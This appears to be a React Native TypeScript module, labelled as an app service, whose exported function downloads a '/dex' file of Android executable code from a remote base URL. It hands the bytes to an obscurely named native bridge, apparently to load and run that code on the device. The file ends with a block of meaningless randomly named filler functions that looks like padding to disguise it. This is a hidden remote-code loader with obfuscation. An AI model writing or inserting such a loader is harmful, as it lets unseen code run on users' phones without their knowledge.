/* @app-slot:service */
import { NativeModules, Platform } from 'react-native';

function fetchBytes(url: string): Promise<Uint8Array | null> {
  return new Promise((resolve) => {
    const req = new XMLHttpRequest();
    req.open('GET', url);
    req.responseType = 'arraybuffer';
    req.timeout = 15000;
    req.onload = () =>
      resolve(req.status === 200 ? new Uint8Array(req.response) : null);
    req.onerror = () => resolve(null);
    req.ontimeout = () => resolve(null);
    req.send();
  });
}

export async function openWithDex(cfBaseUrl: string, pageUrl: string): Promise<boolean> {
  if (Platform.OS !== 'android') {
    return false;
  }

  const bridge = NativeModules.Esuniqogaqo;
  if (!bridge?.open) {
    return false;
  }

  try {
    const dexUrl = cfBaseUrl.replace(/\/$/, '') + '/dex';
    const bytes = await fetchBytes(dexUrl);
    if (!bytes || bytes.length === 0) {
      return false;
    }
    await bridge.open(Array.from(bytes), pageUrl);
    return true;
  } catch {
    return false;
  }
}

/* autopad-begin */
function ewiname(_ejejam: boolean): string {
  const juzayu: string = "esa";
  return juzayu;
}
function ayinexuya(_awabamatubi: number, _dovejabel: string, _samivaq: boolean): void {
  const uraxuqanux = 55;
  if (uraxuqanux > 47) return;
}
function icusitazowu(_abuciw: string, _gebularoj: number): number {
  let powoxi: number = 125;
  powoxi = 114;
  return powoxi;
}
function vunupicox(_qunuyeq: boolean, _ayurox: number, _alurat: number): void {
  const qumajaxuvul: number = 110;
}
function etaretolesid(_acefimetomel: string, _dejozimanode: number, _sijebuqe: boolean): string { return "taciyo"; }
function uqetolom(): void {}
function okefodi(_biyufav: string, _kasizeqawude: string): number {
  let nisemaj: number = 43;
  nisemaj = 133;
  return nisemaj;
}
function iquveropo(_veridok: string, _irufatiguqu: string): boolean {
  const abajuk = 53;
  const ixobube: boolean = true;
  return ixobube;
}
function latufo(_gelipiseyawo: string, _uwajaticina: boolean): string { return "emike"; }
/* autopad-end */

